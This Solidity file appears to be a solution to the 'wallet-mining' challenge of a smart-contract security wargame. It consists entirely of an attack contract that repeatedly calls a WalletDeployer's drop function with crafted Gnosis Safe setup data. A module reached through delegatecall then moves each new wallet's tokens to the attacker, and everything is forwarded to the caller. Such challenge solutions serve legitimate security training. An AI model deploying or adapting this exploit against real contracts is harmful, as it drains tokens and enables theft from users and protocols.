// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../wallet-mining/WalletDeployer.sol";

contract WalletDeployerAttacker{
    constructor(WalletDeployer walletDeployer, uint256 round, IERC20 token){
        TrasnferTokenModule module = new TrasnferTokenModule();
        bytes memory moduleData = getModuleData(address(token));
        bytes memory setupData = getSetupData(address(module), moduleData);
        for(uint256 r ; r<round ; ++r){
            walletDeployer.drop(setupData);
        }
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function getSetupData(address module, bytes memory moduleData) internal view returns(bytes memory) {
        address[] memory _owners = new address[](1);
        _owners[0] = msg.sender;
        return abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            _owners,        //owners[]
            1,              //threshold
            module,       //to
            moduleData,   //data
            address(0),     //fallback
            address(0),     //paymentToken
            0,              //payment
            address(0)      //paymentReceiver
        );
    }

    function getModuleData(address token) internal view returns(bytes memory){
        return abi.encodeWithSelector(
            TrasnferTokenModule.transferToken.selector, 
            token,
            address(this)
        );
    }
}

contract TrasnferTokenModule {
    function transferToken(address token, address receiver) external {
        uint256 amount =  IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(receiver, amount);
    }
}